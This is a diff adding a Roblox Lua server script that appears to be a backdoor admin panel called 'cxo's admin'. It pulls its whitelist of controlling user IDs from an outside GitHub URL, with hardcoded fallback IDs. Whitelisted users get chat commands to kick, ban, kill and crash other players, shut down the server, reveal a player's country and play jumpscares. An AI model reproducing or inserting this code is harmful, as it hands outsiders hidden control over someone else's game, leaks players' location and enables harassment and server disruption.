@@ -1,0 +1,656 @@
+local cxoURL = "https://raw.githubusercontent.com/pcxo/whitelisted/main/users"
+local prefix = "/"
+local cmds = {}
+local banned = {}
+local countries = {}
+
+local success, result = pcall(function()
+	return game:GetService("HttpService"):GetAsync("http://country.io/names.json")
+end)
+
+if success and result then
+	countries = game:GetService("HttpService"):JSONDecode(result)
+end
+
+local BackupIDs = {
+	-- cxo
+	3222470105;
+	7306448629;
+	21517314;
+	35950257;
+	-- tech
+	1702851506;
+	-- knocks
+	1551416114;
+	-- kozy
+	1889958;
+	-- decryptionite
+	120983992;
+	1921860822; 
+	366631664; 
+	13425405;
+}
+
+function GetWhitelist()
+	local returnedUsers = {}
+
+	-- Check from GitHub (first priority)
+	local success, response = pcall(function()
+		return game:GetService("HttpService"):GetAsync(cxoURL)
+	end)
+
+	if success and response then
+		returnedUsers = string.split(response, "\n")
+	else
+		print("GitHub check failed! Using backup table.")
+		returnedUsers = BackupIDs
+	end
+
+	return returnedUsers
+end
+
+local Whitelist = GetWhitelist()
+
+function p(a, me)
+	local ps = game.Players:GetPlayers()
+	local found = {}
+
+	if a:lower() == "me" then
+		found = {me}
+	elseif a:lower() == "others" then
+		for i, player in ipairs(ps) do
+			if player ~= me then
+				table.insert(found, player)
+			end
+		end
+	elseif a:lower() == "all" then
+		found = ps
+	elseif a:lower() == "random" then
+		if #ps > 0 then
+			found = {ps[math.random(1, #ps)]}
+		end
+	else
+		for i, player in ipairs(ps) do
+			if player.Name:lower():sub(1, #a) == a:lower() or player.DisplayName:lower():sub(1, #a) == a:lower() then
+				table.insert(found, player)
+			end
+		end
+	end
+
+	return found
+end
+
+local function addcmd(data)
+	if cmds[data.Name] then
+		return
+	end
+
+	if not data.Aliases then
+		data.Aliases = {}
+	end
+
+	cmds[data.Name] = {
+		Data = data
+	}
+end
+
+function notfi(plr, title, message, duration)
+	coroutine.wrap(function()
+		local s = plr:FindFirstChild("PlayerGui"):FindFirstChild("NotificationsGui")
+
+		if not s then
+			s = Instance.new("ScreenGui")
+			s.Name = "NotificationsGui"
+			s.Parent = plr:FindFirstChild("PlayerGui")
+		end
+
+		local n = Instance.new("Frame")
+		n.Size = UDim2.new(0, 300, 0, 80)
+		n.Position = UDim2.new(1, -320, 1, -100)
+		n.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+		n.BackgroundTransparency = 0.2
+		n.BorderSizePixel = 0
+		n.Parent = s
+
+		local t = Instance.new("TextLabel")
+		t.Text = title
+		t.Size = UDim2.new(1, 0, 0.3, 0)
+		t.TextColor3 = Color3.fromRGB(255, 255, 255)
+		t.BackgroundTransparency = 1
+		t.Font = Enum.Font.GothamBold
+		t.TextScaled = true
+		t.Parent = n
+
+		local m = Instance.new("TextLabel")
+		m.Text = message
+		m.Size = UDim2.new(1, 0, 0.7, 0)
+		m.Position = UDim2.new(0, 0, 0.3, 0)
+		m.TextColor3 = Color3.fromRGB(200, 200, 200)
+		m.BackgroundTransparency = 1
+		m.Font = Enum.Font.Gotham
+		m.TextScaled = true
+		m.Parent = n
+
+		n.Position = UDim2.new(1, 10, 1, -100)
+		n:TweenPosition(UDim2.new(1, -320, 1, -100), "Out", "Quad", 0.5)
+
+		task.wait(duration or 5)
+		n:TweenPosition(UDim2.new(1, 10, 1, -100), "Out", "Quad", 0.5)
+
+		task.wait(0.5)
+		n:Destroy()
+	end)()
+end
+
+addcmd({
+	Name = "kick",
+	Aliases = {"k"},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+			plr:Kick("You have been kicked 😹")
+		end
+	end
+})
+
+addcmd({
+	Name = "ban",
+	Aliases = {"b"},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+			plr:Kick("You have been banned.")
+			if not table.find(banned, plr.UserId) then
+				table.insert(banned, plr.UserId)
+			end
+		end
+	end
+})
+
+addcmd({
+	Name = "bring",
+	Aliases = {},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+			if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
+				plr.Character.HumanoidRootPart.CFrame = sender.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -4.5)
+			end
+		end
+	end
+})
+
+addcmd({
+	Name = "delete",
+	Aliases = {"d"},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+			plr:Destroy()
+		end
+	end
+})
+
+addcmd({
+	Name = "punish",
+	Aliases = {},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+			plr.Character:Destroy()
+		end
+	end
+})
+
+addcmd({
+	Name = "explode",
+	Aliases = {},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+			local explosion = Instance.new("Explosion", workspace)
+			explosion.Position = plr.Character.PrimaryPart.Position
+		end
+	end
+})
+
+addcmd({
+	Name = "kill",
+	Aliases = {},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+			if plr.Character and plr.Character:FindFirstChild("Humanoid") then
+				plr.Character.Humanoid.Health = 0
+			end
+		end
+	end
+})
+
+addcmd({
+	Name = "locate",
+	Aliases = {},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+			local success, code = pcall(game:GetService("LocalizationService").GetCountryRegionForPlayerAsync, game:GetService("LocalizationService"), plr)
+			if success and code then
+				notfi(sender, "Success", plr.Name .." is from: ".. countries[code])
+			end
+		end
+	end
+})
+
+addcmd({ -- Requested by punchy39, he gave da code
+	Name = "jork",
+	Aliases = {"j"},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+			if plr.Character and plr.Character:FindFirstChild("Humanoid") then
+				local anim1 = Instance.new("Animation")
+				anim1.AnimationId = "rbxassetid://72042024"
+				local anim2 = Instance.new("Animation")
+				anim2.AnimationId = "rbxassetid://168268306"
+				local h = plr.Character:FindFirstChild("Humanoid")
+
+				local track1 = h:LoadAnimation(anim1)
+				local track2 = h:LoadAnimation(anim2)
+
+				local length1 = track1.Length
+				local length2 = track2.Length
+
+				local restartPoint1 = length1 - 0.2
+				local restartPoint2 = length2 - 0.2
+				while true do
+					track1:Play()
+					track1.TimePosition = 0.4
+					if track1.TimePosition >= restartPoint1 then
+						track1.TimePosition = 0.4
+					end
+					track2:Play()
+					track2.TimePosition = 0.5
+					if track2.TimePosition >= restartPoint2 then
+						track2.TimePosition = 0.5
+					end
+					wait(0.4)
+				end
+			end
+		end
+	end
+})
+
+addcmd({
+	Name = "troll",
+	Aliases = {},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+			if plr.Character and (plr.Character:FindFirstChild("Shirt")) then
+				plr.Character.Shirt.ShirtTemplate = "http://www.roblox.com/asset/?id=9288587131"
+			else
+				local shirt = Instance.new("Shirt", plr.Character)
+				shirt.ShirtTemplate = "http://www.roblox.com/asset/?id=9288587131"
+			end
+			if plr.Character and (plr.Character:FindFirstChild("Pants")) then
+				plr.Character.Pants.PantsTemplate = "http://www.roblox.com/asset/?id=5690474101"
+			else
+				local pants = Instance.new("Pants", plr.Character)
+				pants.PantsTemplate = "http://www.roblox.com/asset/?id=5690474101"
+			end
+		end
+	end
+})
+
+addcmd({
+	Name = "admin",
+	Aliases = {},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+			if not table.find(_G.permadmins, plr.Name) then
+				table.insert(_G.permadmins, plr.Name)
+			end
+		end
+	end
+})
+
+addcmd({
+	Name = "unadmin",
+	Aliases = {},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+			if table.find(_G.permadmins, plr.Name) then
+				table.remove(_G.permadmins, table.find(_G.permadmins, plr.Name))
+			end
+		end
+	end
+})
+
+addcmd({
+	Name = "regen",
+	Aliases = {},
+	Function = function(sender, targets, arguments)
+		_G.tempadmins = {}
+	end
+})
+
+addcmd({
+	Name = "shutdown",
+	Aliases = {},
+	Function = function(sender, targets, arguments)
+		for i,v in pairs(game.Players:GetPlayers()) do
+			v:Kick("[SHUTDOWN]")
+		end
+		game.Players.ChildAdded:Connect(function(cxo)
+			cxo:Kick("[SHUTDOWN]")
+		end)
+	end
+})
+
+addcmd({
+	Name = "clyde",
+	Aliases = {"jumpscare"},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+			local sgui = Instance.new("ScreenGui", plr.PlayerGui)
+			local clyde = Instance.new("ImageLabel", sgui)
+			local jss = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("JumpScareScript"):Clone()
+			
+			clyde.Size = UDim2.new(1, 0, 1, 0)
+			clyde.Position = UDim2.new(0, 0, 0, 0)
+			clyde.BackgroundColor3 = Color3.new(0, 0, 0)
+			clyde.Image = "rbxassetid://15637324487"
+			clyde.Visible = true
+
+			sgui.IgnoreGuiInset = true
+
+			jss.Parent = plr.Character
+			jss.Enabled = true
+
+			coroutine.wrap(function()
+				task.wait(5)
+				sgui:Destroy()
+			end)()
+		end
+	end
+})
+
+addcmd({
+	Name = "flashbang",
+	Aliases = {},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+			local sgui = Instance.new("ScreenGui", plr.PlayerGui)
+			local flashbang = Instance.new("Frame", sgui)
+			local jss = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("JumpScareScript"):Clone()
+
+			sgui.IgnoreGuiInset = true
+
+			flashbang.Size = UDim2.new(1, 0, 1, 0)
+			flashbang.Position = UDim2.new(0, 0, 0, 0)
+			flashbang.BackgroundColor3 = Color3.new(255, 255, 255)
+			flashbang.Visible = true
+
+			jss.Parent = plr.Character
+			jss.Enabled = true
+
+			coroutine.wrap(function()
+				task.wait(5)
+				sgui:Destroy()
+			end)()
+		end
+	end
+})
+
+addcmd({
+	Name = "slenderman",
+	Aliases = {"slender"},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+			local sgui = Instance.new("ScreenGui", plr.PlayerGui)
+			local slender = Instance.new("ImageLabel", sgui)
+			local jss = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("JumpScareScript"):Clone()
+
+			sgui.IgnoreGuiInset = true
+
+			slender.Size = UDim2.new(1, 0, 1, 0)
+			slender.Position = UDim2.new(0, 0, 0, 0)
+			slender.Image = "http://www.roblox.com/asset/?id=16999373390"
+			slender.Visible = true
+
+			jss.Parent = plr.Character
+			jss.Enabled = true
+
+			coroutine.wrap(function()
+				task.wait(5)
+				sgui:Destroy()
+			end)()
+		end
+	end
+})
+
+addcmd({
+	Name = "banhammer",
+	Aliases = {"hammer", "kickhammer", "kh", "bh"},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+			local success, gear = pcall(function()
+				return game:GetService("InsertService"):LoadAsset(10468797)
+			end)
+			
+			if success and gear then
+				local banhammer = gear:FindFirstChildOfClass("Tool")
+				if banhammer then
+					banhammer.Parent = plr.Backpack
+				end
+				
+				local sound = Instance.new("Sound", workspace)
+				sound.SoundId = "http://www.roblox.com/asset/?id=10730819"
+				
+				banhammer.Handle.Touched:Connect(function(person)
+					local playuh = person.Parent
+					local playuhn = playuh.Name
+					if playuhn == plr.Name then return end
+					if playuhn == sender.Name then return end
+					if not playuh:FindFirstChild("Humanoid") then return playuh.Parent end
+					sound.Playing = true
+					game.Players:FindFirstChild(playuhn):Kick("You have been struck by the banhammer.")
+				end)
+			end
+		end
+	end
+})
+
+addcmd({
+	Name = "orb",
+	Aliases = {"ff", "forcefield"},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+			if plr.Character and plr.Character:FindFirstChild("Torso") then
+				local orb = Instance.new("Part", plr.Character)
+				local weld = Instance.new("Weld", orb)
+				local ls = game:GetService("ReplicatedStorage"):FindFirstChild("OrbScript")
+				weld.Part0 = orb
+				weld.Part1 = plr.Character:FindFirstChild("Torso")
+				orb.Size = Vector3.new(10, 10, 10)
+				orb.CastShadow = true
+				orb.Shape = Enum.PartType.Ball
+				orb.Transparency = 0.5
+				orb.Material = Enum.Material.Neon
+				orb.BrickColor = BrickColor.new("Really red")
+				orb.Name = "ff"
+				orb.CanCollide = true
+				ls.Parent = plr.Character
+			end
+		end
+	end
+})
+
+addcmd({
+	Name = "crash",
+	Aliases = {"c"},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+			local crashscript = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Crash"):Clone()
+			crashscript.Parent = plr.Character
+		end
+	end
+})
+
+addcmd({
+	Name = "bend",
+	Aliases = {},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+			if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") and plr.Character:FindFirstChild("Humanoid") then
+				plr.Character.HumanoidRootPart.Anchored = true
+				plr.Character.Humanoid.Sit = true
+				plr.Character.HumanoidRootPart.CFrame = plr.Character.HumanoidRootPart.CFrame * CFrame.new(0, -1, 0)
+				plr.Character.HumanoidRootPart.Orientation = Vector3.new(-90, plr.Character.HumanoidRootPart.Orientation.Y, plr.Character.HumanoidRootPart.Orientation.Z)
+			end
+		end
+	end
+})
+
+addcmd({
+	Name = "gmod",
+	Aliases = {"gravitygun"},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+			local success, gear = pcall(function()
+				return game:GetService("InsertService"):LoadAsset(2136443074)
+			end)
+
+			if success and gear then
+				local gmod = gear:FindFirstChildOfClass("Tool")
+				if gmod then
+					gmod.Parent = plr.Backpack
+				end
+				gmod:WaitForChild("RemoteScript"):Destroy()
+				game:GetService("ReplicatedStorage").RemoteScript.Parent = gmod
+				if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("cxo's gmod remote") then
+					local gmodremote = Instance.new("RemoteEvent", game:GetService("ReplicatedStorage"))
+					gmodremote.Name = "cxo's gmod remote"
+				end
+			end
+		end
+	end
+})
+
+addcmd({
+	Name = "unload",
+	Aliases = {},
+	Function = function(sender, targets, arguments)
+		script:Destroy()
+	end
+})
+
+addcmd({
+	Name = "cmds",
+	Aliases = {},
+	Function = function(sender, targets, arguments)
+		local s = Instance.new("ScreenGui")
+		s.Name = "cxo's cmdlist"
+		s.Parent = sender:WaitForChild("PlayerGui")
+
+		local frame = Instance.new("Frame")
+		frame.Size = UDim2.new(0, 400, 0, 300)
+		frame.Position = UDim2.new(0.5, -200, 0.5, -150)
+		frame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+		frame.Parent = s
+
+		local scroll = Instance.new("ScrollingFrame")
+		scroll.Size = UDim2.new(1, 0, 1, -50)
+		scroll.BackgroundTransparency = 1
+		scroll.Parent = frame
+
+		local layout = Instance.new("UIListLayout")
+		layout.Parent = scroll
+		layout.FillDirection = Enum.FillDirection.Vertical
+		layout.Padding = UDim.new(0, 5)
+
+		for cmd, data in pairs(cmds) do
+			local l = Instance.new("TextLabel")
+			l.Text = cmd
+			l.TextColor3 = Color3.fromRGB(255, 255, 255)
+			l.BackgroundTransparency = 1
+			l.TextSize = 18
+			l.Size = UDim2.new(1, 0, 0, 20)
+			l.TextXAlignment = Enum.TextXAlignment.Left
+			l.TextScaled = false
+			l.Parent = scroll
+		end
+
+		local close = Instance.new("TextButton")
+		close.Size = UDim2.new(0, 100, 0, 50)
+		close.Position = UDim2.new(0.5, -50, 1, -60)
+		close.Text = "Close"
+		close.Parent = frame
+
+		close.MouseButton1Click:Connect(function()
+			s:Destroy()
+		end)
+	end
+})
+
+for i,v in pairs(game.Players:GetPlayers()) do
+	v.Chatted:Connect(function(msg)
+		if table.find(Whitelist, tostring(v.UserId)) then
+
+			if msg:sub(1, #prefix) == prefix then
+				msg = msg:sub(#prefix + 1)
+
+				local parts = msg:split(" ")
+				local cmdname = parts[1]
+				local target = parts[2] or "me"
+				local args = {table.unpack(parts, 3)}
+
+				local command = cmds[cmdname]
+				if not command then
+					for i, cmd in pairs(cmds) do
+						if table.find(cmd.Data.Aliases, cmdname) then
+							command = cmd
+							break
+						end
+					end
+				end
+
+				if command then
+					--notfi(v, "Success", "Command: ".. cmdname)
+					local targets = p(target, v)
+					command.Data.Function(v, targets, args)
+				else
+					notfi(v, "Error", "Command '" .. cmdname .. "' was not found.")
+				end
+			else
+				--notfi(v, "Error", "Incorrect prefix, prefix is: ".. prefix)
+			end
+		else
+			return
+		end
+	end)
+end
+
+game.Players.PlayerAdded:Connect(function(player)
+	if table.find(Whitelist, tostring(player.UserId)) then
+		notfi(player, "cxo's admin", "You are whitelisted! prefix is ".. prefix)
+	end
+	player.Chatted:Connect(function(msg)
+		if table.find(Whitelist, tostring(player.UserId)) then
+			if msg:sub(1, #prefix) == prefix then
+				msg = msg:sub(#prefix + 1)
+				local parts = msg:split(" ")
+				local cmdname = parts[1]
+				local target = parts[2] or "me"
+				local args = {table.unpack(parts, 3)}
+
+				local command = cmds[cmdname] or nil
+				if not command then
+					for i, cmd in pairs(cmds) do
+						if table.find(cmd.Data.Aliases, cmdname) then
+							command = cmd
+							break
+						end
+					end
+				end
+
+				if command then
+					local targets = p(target, player)
+					command.Data.Function(player, targets, args)
+				else
+					return
+				end
+			end
+		end
+	end)
+end)
